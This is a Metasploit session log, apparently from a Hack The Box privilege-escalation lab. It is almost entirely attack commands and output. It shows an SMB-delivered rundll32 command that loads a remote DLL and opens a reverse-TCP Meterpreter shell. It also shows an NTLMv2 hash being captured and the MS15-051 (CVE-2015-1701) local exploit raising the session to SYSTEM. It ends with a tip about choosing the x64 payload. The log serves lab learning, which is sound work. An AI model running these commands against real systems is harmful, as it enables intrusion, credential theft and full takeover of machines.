...
---
[msf](Jobs:5 Agents:1) exploit(windows/smb/smb_delivery) >> set PAYLOAD windows/x64/meterpreter/reverse_tcp
PAYLOAD => windows/x64/meterpreter/reverse_tcp
[msf](Jobs:5 Agents:1) exploit(windows/smb/smb_delivery) >> sessions -k 11
[*] Killing the following session(s): 11
[*] Killing session 11
[*] 10.129.175.91 - Meterpreter session 11 closed.
[msf](Jobs:5 Agents:0) exploit(windows/smb/smb_delivery) >> set LPORT 5566
LPORT => 5566
[msf](Jobs:5 Agents:0) exploit(windows/smb/smb_delivery) >> run
[*] Exploit running as background job 7.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 10.10.15.107:5566 
[*] Server is running. Listening on 10.10.15.107:445
[*] Server started.
[*] Run the following command on the target machine:
[msf](Jobs:6 Agents:0) exploit(windows/smb/smb_delivery) >> rundll32.exe \\10.10.15.107\sMDzzb\test.dll,0
[SMB] NTLMv2-SSP Client     : 10.129.175.91
[SMB] NTLMv2-SSP Username   : WINLPE-2K8\htb-student
[SMB] NTLMv2-SSP Hash       : htb-student::WINLPE-2K8:0d7e43bf69404198:6c35896704359482d038a1a1b4331880:

[*] Sending stage (203846 bytes) to 10.129.175.91
[*] Meterpreter session 12 opened (10.10.15.107:5566 -> 10.129.175.91:49205) at 2026-01-16 14:57:48 -0600

[msf](Jobs:6 Agents:1) exploit(windows/smb/smb_delivery) >> sessions 12
[*] Starting interaction with 12...

(Meterpreter 12)(C:\Tools) > sysinfo
Computer        : WINLPE-2K8
...
(Meterpreter 12)(C:\Tools) > bg
[*] Backgrounding session 12...
[msf](Jobs:6 Agents:1) exploit(windows/smb/smb_delivery) >> search 2015-1701
...
[msf](Jobs:6 Agents:1) exploit(windows/smb/smb_delivery) >> use 0
[*] Using configured payload windows/meterpreter/reverse_tcp
[msf](Jobs:6 Agents:1) exploit(windows/local/ms15_051_client_copy_image) >> options
...
Payload options (windows/meterpreter/reverse_tcp):
   ...
   LHOST     10.10.15.107     yes       The listen address (an interface may be specified)
...
[msf](Jobs:6 Agents:1) exploit(windows/local/ms15_051_client_copy_image) >> set SESSION 12
SESSION => 12
[msf](Jobs:6 Agents:1) exploit(windows/local/ms15_051_client_copy_image) >> run
[-] Exploit failed: windows/meterpreter/reverse_tcp is not a compatible payload.
[*] Exploit completed, but no session was created.
[msf](Jobs:6 Agents:1) exploit(windows/local/ms15_051_client_copy_image) >> set PAYLOAD windows/x64/meterpreter/reverse_tcp
PAYLOAD => windows/x64/meterpreter/reverse_tcp
[msf](Jobs:6 Agents:1) exploit(windows/local/ms15_051_client_copy_image) >> run
[*] Started reverse TCP handler on 10.10.15.107:5554 
[*] Reflectively injecting the exploit DLL and executing it...
[*] Launching msiexec to host the DLL...
[+] Process 2468 launched.
[*] Reflectively injecting the DLL into 2468...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Sending stage (203846 bytes) to 10.129.175.91
[*] Meterpreter session 13 opened (10.10.15.107:5554 -> 10.129.175.91:49206) at 2026-01-16 15:00:57 -0600

(Meterpreter 13)(C:\Tools) > getuid
Server username: NT AUTHORITY\SYSTEM


The key was set PAYLOAD windows/x64/meterpreter/reverse_tcp on both the smb_delivery and the CVE 2015-1701 vuln